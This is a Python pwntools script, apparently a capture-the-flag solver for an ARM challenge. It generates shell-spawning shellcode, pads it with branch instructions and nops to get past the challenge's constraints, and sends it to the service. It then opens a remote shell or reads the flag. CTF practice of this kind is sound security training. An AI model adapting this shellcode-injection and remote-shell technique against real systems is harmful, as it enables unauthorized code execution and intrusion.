#!/usr/bin/env python

import os
from os import system as run
from os.path import *
import sys
from sys import exit

from pwn import *
import click

context.log_level = 'info'


PAYLOAD_FP = 'payload.dat' # cache
PAYLOADSIZE = 420


@click.group()
def cli():
    pass


@cli.command()
def shell():
    import IPython; IPython.embed()
    pass

@cli.command()
def armtests():
    with open('bits') as f:
        allbits = f.read().split('\n')

    def bits2chr(bits):
        return chr(int(bits, 2))

    def flip(bits, idx):
        bits = bits[:idx] + ('0' if int(bits[idx]) == 1 else '1') + bits[idx+1:]
        return bits

    def bits2disasm(bits):
        assert len(bits) == 32
        cc = bits2chr(bits[24:32]) + bits2chr(bits[16:24]) + bits2chr(bits[8:16]) + bits2chr(bits[0:8])
        return disasm(cc)

    context.arch = 'arm'
    context.log_level = 'info'

    for bits in allbits:
        if bits.strip() == '': continue
        print bits2disasm(bits)

    # bits = allbits[0]
    # for idx in range(32):
        # newbits = flip(bits, idx)
        # print 'flipping %d' % idx,
        # print bits2disasm(newbits)

    xxx = ''
    for _ in range(200/8):
        xxx += 'nop\n'
        xxx += 'b peppa\n'
    xxx += 'peppa: eor r0, r0\n'
    print asm(xxx)
    import IPython; IPython.embed()


@cli.command()
def genpattern():
    context.log_level = 'info'
    context.arch = 'arm'

    inss = ''

    targetoff = 200
    for idx in range(0, 200/8):
        curroff = (idx*8+4) # + prefixsize
        x = (targetoff-curroff) / 4 - 2
        print 'idx: %d, x: %d' % (idx, x)

        inss += asm('nop') # player ins
        if x >= 0:
            inss += chr(x) + '\x00\x00\xea' # b exit
        elif x == -1:
            inss += '\xff\xff\xff\xea' # b -1
        else:
            raise Exception()

    import IPython; IPython.embed()





@cli.command()
def genbytes():
    # generate copypastable prefix and suffix bytes for the shellcode

    context.log_level = 'info'
    context.arch = 'arm'

    def encode_to_c(s):
        ss = ''.join([ '\\x%s' % x.encode('hex') for x in s ])
        return ss

    # reset everything except sp and pc
    prefix_shellcode = '''
        eor r0, r0
        eor r1, r1
        eor r2, r2
        eor r3, r3
        eor r4, r4
        eor r5, r5
        eor r6, r6
        eor r7, r7
        eor r8, r8
        eor r9, r9
        eor r10, r10
        eor r11, r11
        eor r12, r12
        eor lr, lr
    '''
    prefix = asm(prefix_shellcode)
    print 'Prefix (len: %d): "%s"' % (len(prefix), encode_to_c(prefix))

    suffix = asm(shellcraft.exit(1))
    print 'Suffix (len: %d): "%s"' % (len(suffix), encode_to_c(suffix))

def padit(shellcode):
    out = ''
    for elem in group(4, shellcode):
        out += elem
        out += asm('nop') # unrelevant
    return out


@cli.command()
@click.option('--withdebug', is_flag=True, default=False)
@click.option('--debug', is_flag=True, default=False)
@click.option('--local', is_flag=True, default=False)
@click.option('--host', default=None)
@click.option('--arch', default='arm')
@click.option('--shell', is_flag=True, default=False)
def ex(withdebug, debug, local, host, arch, shell):

    assert arch in ['x86', 'arm']

    context.arch = arch

    if host is None:
        host = 'localhost'

    while True:
        if local:
            io = remote(host, 31337)
        else:
            io = remote(host, 4242)

        rnds = []
        for _ in range(4):
            rnd = u8(io.recv(1))
            rnds.append(rnd)
        print rnds, sum(rnds)

        if reduce(lambda x,y:x^y, rnds) % 4 == 0:
            print 'good rnds'
            break
        else:
            print 'bad rnds, trying again'
            io.shutdown()
            io.close()


    # code below only works for cond == 0

    context.log_level = 'info'

    def addjumps(payload, idxs, idxs16, idxs32):
        nop = asm('nop')
        def getnopsnum(n): return (n/4-1)
        jump8 = asm('b xxx\n ' + 'nop\n'*getnopsnum(8) +  'xxx:nop\n')[:4]
        jump16 = asm('b xxx\n ' + 'nop\n'*getnopsnum(16) +  'xxx:nop\n')[:4]
        jump32 = asm('b xxx\n ' + 'nop\n'*getnopsnum(32) +  'xxx:nop\n')[:4]

        out = ''
        idx = 0
        elems = list(group(4, payload))
        elem_idx = 0
        while elem_idx < len(elems):
            if idx in idxs:
                out += jump8
            elif idx in idxs16:
                out += jump16
                out += nop*1 # 16/8-1
                idx += 1
            elif idx in idxs32:
                out += jump32
                out += nop*3 # 32/8-1
                idx += 3
            else:
                out += elems[elem_idx]
                elem_idx += 1
            idx += 1
        return out

    print 'generating shellcode'

    if isfile(PAYLOAD_FP):
        with open(PAYLOAD_FP, 'rb') as f:
            payload = f.read()
    else:
        # shellcode = asm(shellcraft.write(1, "itworks\x00", 8))
        shellcode = shellcraft.sh()
        payload = asm(shellcode)
        payload = addjumps(payload, [0, 2, 5, 7, 18, 21, 23, 34, 39], [9, 25, 36, 41], [13, 29, 45])
        payload = padit(payload)
        # shellcode = asm('bx r0')
        # shellcode += asm('blx r12')
        assert len(payload) <= PAYLOADSIZE
        payload = payload.ljust(PAYLOADSIZE, 'X')

        with open(PAYLOAD_FP, 'wb') as f:
            f.write(payload)

    print 'generated'
    context.log_level = 'info'

    io.send(payload)

    io.recvuntil('BAM!\n')

    if shell:
        print 'enjoy shell'
        io.interactive()
    else:
        io.sendline('cat flag')
        print 'FLAG: ' + io.recv(4096)

    io.shutdown()
    io.close()


if __name__ == '__main__':
    cli()
